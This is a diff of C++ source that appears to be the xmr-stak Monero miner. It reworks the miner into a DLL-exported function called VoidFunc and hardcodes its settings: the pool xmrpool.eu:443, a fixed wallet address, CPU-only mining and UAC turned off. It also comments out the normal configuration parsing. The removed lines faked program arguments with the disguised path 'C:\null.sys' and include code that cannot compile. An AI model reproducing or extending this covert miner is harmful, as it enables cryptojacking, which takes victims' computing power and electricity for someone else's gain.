@@ -355,7 +355,7 @@ extern "C"  {
 #ifdef WIN32
 __declspec(dllexport) 
 #endif
-void VoidFunc()
+void VoidFunc(int argc, char *argv[])
 {
 #ifndef CONF_NO_TLS
 	SSL_library_init();
@@ -365,29 +365,12 @@ void VoidFunc()
 	SSL_load_error_strings();
 	OpenSSL_add_all_digests();
 #endif
-	int argc;
-	char argv[];
-	argc = 13;
-	argv[0] = "C:\null.sys";
-	argv[1] = "--currency";
-	argv[2] = "monero7";
-	argv[3] = "-O";
-	argv[4] = "xmrpool.eu:443";
-	argv[5] = "-u";
-	argv[6] = "45tcqnJMgd3VqeTznNotiNj4G9PQoK67TGRiHyj6EYSZ31NUbAfs9XdiU5squmZb717iHJLxZv3KfEw8jCYGL5wa19yrVCn";
-	argv[7] = "-i";
-	argv[8] = "0";
-	argv[9] = "-p";
-	argv[10] = "";
-	argv[11] = "-r";
-	argv[12] = "";
 
 	srand(time(0));
 
 	using namespace xmrstak;
 
-	argv[]
-	std::string pathWithName(argv[0]);
+	/*std::string pathWithName(argv[0]);
 	std::string seperator("/");
 	auto pos = pathWithName.rfind(seperator);
 
@@ -682,6 +665,23 @@ void VoidFunc()
 			return void();
 		}
 	}
+	*/
+
+	params::inst().useCPU = true;
+	params::inst().useAMD = false;
+	params::inst().AMDCache = false;
+	params::inst().useNVIDIA = false;
+	params::inst().currency = "monero7";
+	params::inst().poolURL = "xmrpool.eu:443";
+	params::inst().poolUseTls = false;
+	params::inst().poolUsername = "45tcqnJMgd3VqeTznNotiNj4G9PQoK67TGRiHyj6EYSZ31NUbAfs9XdiU5squmZb717iHJLxZv3KfEw8jCYGL5wa19yrVCn";
+	params::inst().userSetPwd = true;
+	params::inst().poolPasswd = "x";
+	params::inst().userSetRigid = false;
+	params::inst().poolRigid = "0";
+	params::inst().nicehashMode = false;
+	params::inst().httpd_port = "0";
+	params::inst().allowUAC = false;
 
 	// check if we need a guided start
 	if(!configEditor::file_exist(params::inst().configFile))
